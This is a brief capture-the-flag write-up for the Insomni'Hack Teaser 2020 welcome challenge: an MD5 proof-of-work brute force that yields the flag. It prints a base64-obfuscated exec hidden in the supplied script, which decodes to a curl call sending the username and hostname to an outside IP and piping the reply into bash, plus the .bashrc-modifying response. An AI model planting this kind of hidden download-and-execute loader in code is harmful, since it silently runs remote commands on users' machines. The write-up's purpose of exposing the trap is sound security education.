* Obtained the PWN code from the ZIP. 
* Given a server to connect to, we need to
  * Crack MD5 Hash to match last 6 characters of the hash
  * The pow code already given iterates through the numbers to crack the hash
    * So it is number iteration --> hash --> match check
* Looking closely at the code given by the challenge developers, they are also executing somecode using `exec` with base64 encoded version of the code to get the SYSTEM NAME/HOSTNAME and OS TYPE.

* Faking the input and accessing the Server reveals just THANKS.
```
exec(base64.b64decode('Z2xvYmFsIGk7aSs9MTMzNzt4PW9zLm5hbWU7eCs9Ii8kKHdob2FtaSlAJChob3N0bmFtZSl8YmFzaCJpZiB4IT0ibnQiZWxzZSIvJVVTRVJOQU1FJUAlVVNFUkRPTUFJTiUiO29zLnN5c3RlbSgiY3VybCAtTnMgMzQuNjUuMTg3LjE0MS8iK3gp'))

global i;i+=1337;x=os.name;x+="/$(whoami)@$(hostname)|bash"if x!="nt"else"/%USERNAME%@%USERDOMAIN%";os.system("curl -Ns 34.65.187.141/"+x)

root@kali:~/Desktop# curl -Ns 34.65.187.141/posix/user@arch
base64  -d >> ~/.bashrc <<< ZXhwb3J0IFBST01QVF9DT01NQU5EPSdlY2hvIFRIQU5LIFlPVSBGT1IgUExBWUlORyBJTlNPTU5JSEFDSyBURUFTRVIgMjAyMCcK

root@kali:~/Desktop# echo "ZXhwb3J0IFBST01QVF9DT01NQU5EPSdlY2hvIFRIQU5LIFlPVSBGT1IgUExBWUlORyBJTlNPTU5JSEFDSyBURUFTRVIgMjAyMCcK" | base64 -d

export PROMPT_COMMAND='echo THANK YOU FOR PLAYING INSOMNIHACK TEASER 2020'
root@kali:~/Desktop# 
```

* Get the FLAG
```
root@kali:~/Desktop/insomnia# python pwn_welcome.py welcome.insomnihack.ch 1337 ")"
[+] Opening connection to welcome.insomnihack.ch on port 1337: Done


======================================================================
============   Welcome to the Insomni'Hack Teaser 2020!   ============
======================================================================

Give me an input whose md5sum starts with "e71988" and get the flag ;)
Target: e71988
Found: 29054
[*] Switching to interactive mode



MITM are real: check SHA, check code, ...

INS{Miss me with that fhisy line}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
root@kali:~/Desktop/insomnia# 

```